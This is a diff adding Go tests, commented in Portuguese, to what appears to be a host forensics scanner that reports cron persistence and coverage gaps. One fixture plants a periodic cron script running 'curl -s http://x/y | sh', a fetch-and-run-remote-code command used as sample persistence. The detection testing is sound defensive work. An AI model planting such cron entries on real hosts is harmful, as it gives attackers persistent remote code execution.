@@ -3,6 +3,7 @@ package facts
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/lex0c/aletheia/internal/env"
@@ -195,5 +196,88 @@ func TestCaminhosDoValor(t *testing.T) {
 				t.Errorf("CaminhosDoValor(%q)[%d] = %q, queria %q", c.v, i, got[i], c.quer[i])
 			}
 		}
+	}
+}
+
+// A lacuna que a ferramenta inteira existe para não cometer.
+//
+// O spool de crontab do Debian é 1730 root:crontab. Uma varredura sem root não
+// consegue LISTÁ-LO, e `ReadDirNames` devolve nada — a mesmíssima saída de um
+// host que não tem crontab de usuário nenhum. O relatório dizia "nada aqui"
+// sobre a superfície de persistência mais usada que existe.
+func TestSpoolDeCronIlegivelViraLacunaENaoRespostaVazia(t *testing.T) {
+	if os.Geteuid() == 0 {
+		t.Skip("root lê tudo: esta lacuna só existe para quem não é root")
+	}
+	raiz := t.TempDir()
+	spool := filepath.Join(raiz, "var/spool/cron/crontabs")
+	if err := os.MkdirAll(spool, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(spool, "deploy"),
+		[]byte("*/5 * * * *\t/opt/app/beacon\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	// O modo do Debian, aplicado depois de plantar: sem +r, não se lista.
+	if err := os.Chmod(spool, 0o300); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { os.Chmod(spool, 0o755) })
+
+	e := env.Probe(env.Options{Root: raiz})
+	t.Cleanup(func() { e.Close() })
+	f := Collect(e)
+
+	if len(f.Cron) != 0 {
+		t.Fatalf("o diretório é ilegível, então não pode sair agendamento: %+v", f.Cron)
+	}
+	motivos := f.PersistDenied["cron"]
+	if len(motivos) == 0 {
+		t.Fatal("spool ilegível saiu como resposta vazia: é exatamente isto que " +
+			"faz um relatório afirmar limpeza onde só houve cegueira")
+	}
+	var citou bool
+	for _, m := range motivos {
+		if strings.Contains(m, "crontabs") {
+			citou = true
+		}
+	}
+	if !citou {
+		t.Errorf("a lacuna precisa NOMEAR o caminho que ficou de fora: %v", motivos)
+	}
+}
+
+// E o outro lado: diretório que não existe é RESPOSTA. A maioria dos hosts não
+// tem /etc/periodic nem /var/spool/at, e transformar cada ausência em lacuna
+// encheria o relatório de ruído até ninguém mais ler a seção de cobertura.
+func TestDiretorioAusenteNaoEhLacuna(t *testing.T) {
+	f := imagem(t, map[string]string{"etc/crontab": "17 * * * * root /x\n"})
+	if m := f.PersistDenied["cron"]; len(m) != 0 {
+		t.Errorf("ausência virou lacuna: %v", m)
+	}
+}
+
+// O busybox do Alpine não usa /etc/cron.daily nem /var/spool/cron: usa
+// /etc/periodic/daily e /etc/crontabs. Sem esses caminhos, varrer uma imagem
+// Alpine — que é a base da maioria dos contêineres — devolvia zero.
+func TestCaminhosDoBusyboxSaoVarridos(t *testing.T) {
+	f := imagem(t, map[string]string{
+		"etc/crontabs/root":       "*/1 * * * * /opt/beacon\n",
+		"etc/periodic/15min/sync": "#!/bin/sh\ncurl -s http://x/y | sh\n",
+	})
+	var spool, periodic bool
+	for _, c := range f.Cron {
+		switch {
+		case c.File == "/etc/crontabs/root" && c.Cmd == "/opt/beacon":
+			spool = true
+		case c.File == "/etc/periodic/15min/sync":
+			periodic = true
+			if c.IntervalSec != 900 {
+				t.Errorf("15min = %ds: o intervalo é o que responde à cadência", c.IntervalSec)
+			}
+		}
+	}
+	if !spool || !periodic {
+		t.Errorf("spool=%v periodic=%v — %+v", spool, periodic, f.Cron)
 	}
 }
